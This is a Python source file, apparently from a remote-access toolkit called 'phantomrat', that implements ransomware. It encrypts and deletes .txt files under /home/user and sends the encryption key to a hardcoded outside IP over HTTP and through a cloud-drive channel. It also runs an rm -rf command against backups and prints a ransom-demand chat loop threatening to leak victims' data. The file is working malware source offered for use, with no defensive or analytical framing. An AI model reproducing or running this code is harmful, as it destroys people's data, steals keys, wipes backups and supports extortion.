import os
import base64
from cryptography.fernet import Fernet
import urllib.request
import json
import time
import random

# Load profile
with open('malleable_profile.json', 'r') as f:
    profile = json.load(f)

key = profile['encryption']['key'].encode()
fernet = Fernet(base64.urlsafe_b64encode(key.ljust(32)[:32]))

def encrypt_data(data):
    return fernet.encrypt(json.dumps(data).encode()).decode()

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file_path + '.encrypted', 'wb') as f:
        f.write(encrypted)
    os.remove(file_path)  # Remove original

def exfil_data(data, url=None):
    # Use cloud for stealth
    from phantomrat_cloud import exfil_via_drive
    exfil_via_drive(data)
    # Fallback to HTTP if needed
    if url:
        encrypted_data = encrypt_data(data)
        req = urllib.request.Request(url, data=encrypted_data.encode(), headers=profile['http-post']['client']['header'])
        urllib.request.urlopen(req)

def wipe_backups():
    # Simulate wiping /var/backups or something
    os.system("rm -rf /tmp/backups/*")

def chat_bot():
    print("Ransom demand: Pay 1 BTC to wallet XXX or data leaked.")
    while True:
        user_input = input("Victim: ")
        if "pay" in user_input.lower():
            print("Payment received. Decrypting...")
            break
        else:
            print("Threatening to leak data...")

if __name__ == "__main__":
    key = generate_key()
    # Find sensitive files
    for root, dirs, files in os.walk('/home/user'):
        for file in files:
            if file.endswith('.txt'):
                encrypt_file(os.path.join(root, file), key)
    # Exfil key or data
    exfil_data({"key": base64.b64encode(key).decode()}, "http://141.105.71.196" + profile['http-post']['client']['uri'])
    wipe_backups()
    chat_bot()